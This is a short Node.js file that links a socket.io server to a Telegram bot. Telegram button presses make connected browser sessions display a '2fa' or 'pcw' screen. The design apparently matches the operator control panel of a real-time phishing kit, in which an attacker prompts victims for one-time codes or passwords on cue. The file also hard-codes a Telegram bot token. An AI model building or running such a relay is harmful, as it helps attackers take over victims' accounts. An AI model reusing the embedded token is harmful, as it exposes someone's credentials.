const express = require('express');
const socket = require('socket.io');
const TelegramBot = require('node-telegram-bot-api'); 

const app = express();
const port = 3000;

const server = app.listen(port, () => console.log(`App listening on port ${port}!`));

const io = socket(server, {
    cors: {
        origin: "*",
        credentials: true,
    },
});

const botToken = '8098135545:AAHUyv83jC0w1T6T0ilDM7JDEEeuLb7YYvA'; 
const bot = new TelegramBot(botToken, { polling: true });

io.on("connection", (socket) => {
    console.log(`A user connected: ${socket.id}`);
    bot.on('callback_query', (callbackQuery) => {
        const [action, socketId] = callbackQuery.data.split('|');

        if (action === '2fa') {
            io.to(socketId).emit('show-2fa');
            console.log(`Emitted 'show-2fa' to socket ID: ${socketId}`);
        } else if (action === 'pcw') {
            io.to(socketId).emit('show-pcw');
            console.log(`Emitted 'show-pcw' to socket ID: ${socketId}`);
        }
    });

    socket.on("disconnect", () => {
        console.log(`A user disconnected: ${socket.id}`);
    });
});
